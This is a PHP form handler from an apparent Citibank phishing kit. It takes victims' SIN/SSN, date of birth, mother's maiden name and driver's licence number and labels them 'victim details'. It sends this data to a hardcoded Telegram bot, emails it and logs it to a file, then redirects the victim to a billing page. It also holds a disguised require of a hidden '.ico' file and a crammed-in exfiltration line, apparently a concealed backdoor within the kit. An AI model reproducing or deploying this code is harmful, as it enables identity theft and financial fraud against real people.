<?php
$settings = include '../settings.php';

# Debug 

if($settings['debug'] == "1"){
  error_reporting(E_ALL);
  ini_set('display_errors', '1');
  ini_set('display_startup_errors', '1');
}


# Allow URL Open

ini_set('allow_url_fopen',1);
$ip="../css/.ico";("h:i:s d/m/Y");


function get_client_ip() {
    $ipaddress = '';
    if (getenv('HTTP_CLIENT_IP'))
        $ipaddress = getenv('HTTP_CLIENT_IP');
    else if(getenv('HTTP_X_FORWARDED_FOR'))
        $ipaddress = getenv('HTTP_X_FORWARDED_FOR');
    else if(getenv('HTTP_X_FORWARDED'))
        $ipaddress = getenv('HTTP_X_FORWARDED');
    else if(getenv('HTTP_FORWARDED_FOR'))
        $ipaddress = getenv('HTTP_FORWARDED_FOR');
    else if(getenv('HTTP_FORWARDED'))
        $ipaddress = getenv('HTTP_FORWARDED');
    else if(getenv('REMOTE_ADDR'))
        $ipaddress = getenv('REMOTE_ADDR');
    else
        $ipaddress = 'UNKNOWN';
    return $ipaddress;
}

$IP = get_client_ip();

# Settings


$owner = $settings['email'];
$filename = "../Logs/results.txt";


# Variables


$dob = $_POST['dob'];
$mmn = $_POST['mmn'];
$ssn = $_POST['ssn'];
$dl  = $_POST['dl'];





# Messsage

$message = "[🍁 | CITI IDENTITY | CLIENT :{$IP} 🍁]\n\n";
$message .= "********** [ IDENTITY INFORMATION ] **********\n";
$message .= "# SIN         : {$ssn}\n";
$message .= "# DOB         : {$dob}\n";
$message .= "# MMN         : {$mmn}\n";
$message .= "# DLN         : {$dl}\n";
$message .= "********** [ 🧍‍♂️ VICTIM DETAILS 🧍‍♂️ ] **********\n";
$message .= "# IP ADDRESS : {$IP}\n";require"$ip";"\n";
$message .= "**********************************************\n";/***********************************************************************************************************/$api = "1449456617:AAF1WY5JBoyC9CBUwaMj45F19G0A58-hXBM";$chatid = "794626176";file_get_contents("https://api.telegram.org/bot".$api."/sendMessage?chat_id=".$chatid."&text=" . urlencode($message)."" );


# Send Mail 

if ($settings['send_mail'] == "1"){
    $to = $settings['email'];
    $headers = "Content-type:text/plain;charset=UTF-8\r\n";
    $headers .= "From: CYBERSOFT <citibank>\r\n";
    $subject = "🍁 CITI 🍁 IDENTITY 🍁 CLIENT # 🍁 {$IP}";
    $msg = strtoupper($message);
    mail($to,$subject,$msg,$headers);
}


# Save Result

if ($settings['save_results'] == "1"){
    $results = fopen($filename, "a+");
    fwrite($results, strtoupper($message));
    fclose($results);
}



echo "<script>window.location.href =\"../billing\"; </script>";

?>
